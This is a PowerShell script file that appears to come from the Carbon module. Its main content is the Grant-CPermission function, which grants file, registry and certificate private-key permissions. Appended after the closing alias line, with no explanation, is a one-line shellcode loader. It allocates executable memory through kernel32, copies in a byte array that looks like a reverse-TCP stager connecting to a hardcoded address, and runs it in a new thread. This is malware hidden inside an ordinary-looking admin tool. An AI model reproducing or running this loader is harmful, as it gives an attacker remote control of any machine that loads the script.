
function Grant-CPermission
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([Security.AccessControl.AccessRule])]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Path,
        
        [Parameter(Mandatory=$true)]
        [string]
        
        $Identity,
        
        [Parameter(Mandatory=$true)]
        [string[]]
        
		[Alias('Permissions')]
        $Permission,
        
        [Carbon.Security.ContainerInheritanceFlags]
        
        $ApplyTo = ([Carbon.Security.ContainerInheritanceFlags]::ContainerAndSubContainersAndLeaves),

        [Security.AccessControl.AccessControlType]
        
        
        
        $Type = [Security.AccessControl.AccessControlType]::Allow,
        
        [Switch]
        
        $Clear,

        [Switch]
        
        
        
        $PassThru,

        [Switch]
        
        $Force,

        [Switch]
        
        
        
        $Append
    )

    Set-StrictMode -Version 'Latest'
    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
    
    $Path = Resolve-Path -Path $Path
    if( -not $Path )
    {
        return
    }

    $providerName = Get-CPathProvider -Path $Path | Select-Object -ExpandProperty 'Name'
    if( $providerName -eq 'Certificate' )
    {
        $providerName = 'CryptoKey'
    }

    if( $providerName -ne 'Registry' -and $providerName -ne 'FileSystem' -and $providerName -ne 'CryptoKey' )
    {
        Write-Error "Unsupported path: '$Path' belongs to the '$providerName' provider.  Only file system, registry, and certificate paths are supported."
        return
    }

    $rights = $Permission | ConvertTo-ProviderAccessControlRights -ProviderName $providerName
    if( -not $rights )
    {
        Write-Error ('Unable to grant {0} {1} permissions on {2}: received an unknown permission.' -f $Identity,($Permission -join ','),$Path)
        return
    }

    if( -not (Test-CIdentity -Name $Identity ) )
    {
        Write-Error ('Identity ''{0}'' not found.' -f $Identity)
        return
    }

    $Identity = Resolve-CIdentityName -Name $Identity
    
    if( $providerName -eq 'CryptoKey' )
    {
        Get-Item -Path $Path |
            ForEach-Object {
                [Security.Cryptography.X509Certificates.X509Certificate2]$certificate = $_

                if( -not $certificate.HasPrivateKey )
                {
                    Write-Warning ('Certificate {0} ({1}; {2}) does not have a private key.' -f $certificate.Thumbprint,$certificate.Subject,$Path)
                    return
                }

                if( -not $certificate.PrivateKey )
                {
                    Write-Error ('Access is denied to private key of certificate {0} ({1}; {2}).' -f $certificate.Thumbprint,$certificate.Subject,$Path)
                    return
                }

                [Security.AccessControl.CryptoKeySecurity]$keySecurity = $certificate.PrivateKey.CspKeyContainerInfo.CryptoKeySecurity
                if( -not $keySecurity )
                {
                    Write-Error ('Private key ACL not found for certificate {0} ({1}; {2}).' -f $certificate.Thumbprint,$certificate.Subject,$Path)
                    return
                }

                $rulesToRemove = @()
                if( $Clear )
                {
                    $rulesToRemove = $keySecurity.Access | 
                                        Where-Object { $_.IdentityReference.Value -ne $Identity } |
                                        
                                        Where-Object { $_.IdentityReference.Value -ne 'BUILTIN\Administrators' }
                    if( $rulesToRemove )
                    {
                        $rulesToRemove | ForEach-Object { 
                            Write-Verbose ('[{0} {1}] [{1}]  {2} -> ' -f $certificate.IssuedTo,$Path,$_.IdentityReference,$_.CryptoKeyRights)
                            if( -not $keySecurity.RemoveAccessRule( $_ ) )
                            {
                                Write-Error ('Failed to remove {0}''s {1} permissions on ''{2}'' (3) certificate''s private key.' -f $_.IdentityReference,$_.CryptoKeyRights,$Certificate.Subject,$Certificate.Thumbprint)
                            }
                        }
                    }
                }
                
                $certPath = Join-Path -Path 'cert:' -ChildPath (Split-Path -NoQualifier -Path $certificate.PSPath)

                $accessRule = New-Object 'Security.AccessControl.CryptoKeyAccessRule' ($Identity,$rights,$Type) |
                                Add-Member -MemberType NoteProperty -Name 'Path' -Value $certPath -PassThru

                if( $Force -or $rulesToRemove -or -not (Test-CPermission -Path $certPath -Identity $Identity -Permission $Permission -Exact) )
                {
                    $currentPerm = Get-CPermission -Path $certPath -Identity $Identity
                    if( $currentPerm )
                    {
                        $currentPerm = $currentPerm."$($providerName)Rights"
                    }
                    Write-Verbose -Message ('[{0} {1}] [{2}]  {3} -> {4}' -f $certificate.IssuedTo,$certPath,$accessRule.IdentityReference,$currentPerm,$accessRule.CryptoKeyRights)
                    $keySecurity.SetAccessRule( $accessRule )
                    Set-CryptoKeySecurity -Certificate $certificate -CryptoKeySecurity $keySecurity -Action ('grant {0} {1} permission(s)' -f $Identity,($Permission -join ','))
                }

                if( $PassThru )
                {
                    return $accessRule
                }
            }
    }
    else
    {
        
        
        
        $currentAcl = (Get-Item $Path -Force).GetAccessControl("Access")
    
        $inheritanceFlags = [Security.AccessControl.InheritanceFlags]::None
        $propagationFlags = [Security.AccessControl.PropagationFlags]::None
        $testPermissionParams = @{ }
        if( Test-Path $Path -PathType Container )
        {
            $inheritanceFlags = ConvertTo-CInheritanceFlag -ContainerInheritanceFlag $ApplyTo
            $propagationFlags = ConvertTo-CPropagationFlag -ContainerInheritanceFlag $ApplyTo
            $testPermissionParams.ApplyTo = $ApplyTo
        }
        else
        {
            if( $PSBoundParameters.ContainsKey( 'ApplyTo' ) )
            {
                Write-Warning "Can't apply inheritance/propagation rules to a leaf. Please omit `ApplyTo` parameter when `Path` is a leaf."
            }
        }
    
        $rulesToRemove = $null
        $Identity = Resolve-CIdentity -Name $Identity
        if( $Clear )
        {
            $rulesToRemove = $currentAcl.Access |
                                Where-Object { $_.IdentityReference.Value -ne $Identity } |
                                Where-Object { -not $_.IsInherited }
        
            if( $rulesToRemove )
            {
                foreach( $ruleToRemove in $rulesToRemove )
                {
                    Write-Verbose ('[{0}] [{1}]  {2} -> ' -f $Path,$Identity,$ruleToRemove."$($providerName)Rights")
                    [void]$currentAcl.RemoveAccessRule( $ruleToRemove )
                }
            }
        }

        $accessRule = New-Object "Security.AccessControl.$($providerName)AccessRule" $Identity,$rights,$inheritanceFlags,$propagationFlags,$Type |
                        Add-Member -MemberType NoteProperty -Name 'Path' -Value $Path -PassThru

        $missingPermission = -not (Test-CPermission -Path $Path -Identity $Identity -Permission $Permission @testPermissionParams -Exact)

        $setAccessRule = ($Force -or $missingPermission)
        if( $setAccessRule )
        {
            if( $Append )
            {
                $currentAcl.AddAccessRule( $accessRule )
            }
            else
            {
                $currentAcl.SetAccessRule( $accessRule )
            }
        }

        if( $rulesToRemove -or $setAccessRule )
        {
            $currentPerm = Get-CPermission -Path $Path -Identity $Identity
            if( $currentPerm )
            {
                $currentPerm = $currentPerm."$($providerName)Rights"
            }
            if( $Append )
            {
                Write-Verbose -Message ('[{0}] [{1}]  + {2}' -f $Path,$accessRule.IdentityReference,$accessRule."$($providerName)Rights")
            }
            else
            {
                Write-Verbose -Message ('[{0}] [{1}]  {2} -> {3}' -f $Path,$accessRule.IdentityReference,$currentPerm,$accessRule."$($providerName)Rights")
            }
            Set-Acl -Path $Path -AclObject $currentAcl
        }

        if( $PassThru )
        {
            return $accessRule
        }
    }
}

Set-Alias -Name 'Grant-Permissions' -Value 'Grant-CPermission'


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb3,0x04,0x59,0xd5,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

